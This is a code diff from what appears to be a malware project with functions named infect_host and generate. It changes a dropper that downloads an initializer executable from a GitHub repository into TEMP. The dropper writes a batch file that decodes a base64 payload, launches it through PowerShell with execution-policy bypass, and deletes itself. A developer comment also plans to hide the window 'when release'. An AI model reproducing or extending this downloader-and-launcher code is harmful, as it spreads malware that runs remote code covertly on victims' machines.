@@ -78,9 +78,9 @@ def infect_host(host, file_path):
         pass
 
 def generate():
-    init_path = os.path.join(os.getenv('TEMP'), 'init.ps1')
+    init_path = os.path.join(os.getenv('TEMP'), 'init.exe')
     bat_path = os.path.join(os.getenv('TEMP'), 'activator.bat')
-    init_link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_initializer.ps1"
+    init_link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
     if not os.path.exists(init_path):
         try:
             r = requests.get(init_link)
@@ -111,7 +111,7 @@ def generate():
             '',
             f'powershell -Command "[IO.File]::WriteAllBytes(\'%temp%\\%exe_name%\', [Convert]::FromBase64String((Get-Content \'%temp%\\%exe_name%.b64\')))"',
             'del "%temp%\\!exe_name!.b64"',
-            'powershell -ep bypass -noP -nonI start-process powershell.exe "{%temp%\\!exe_name!}"',
+            'powershell -ep bypass -noP -nonI start-process powershell.exe "{%temp%\\!exe_name!}"', # remember to use '-w hidden' when release
             'del "%~f0"'
         ])
  
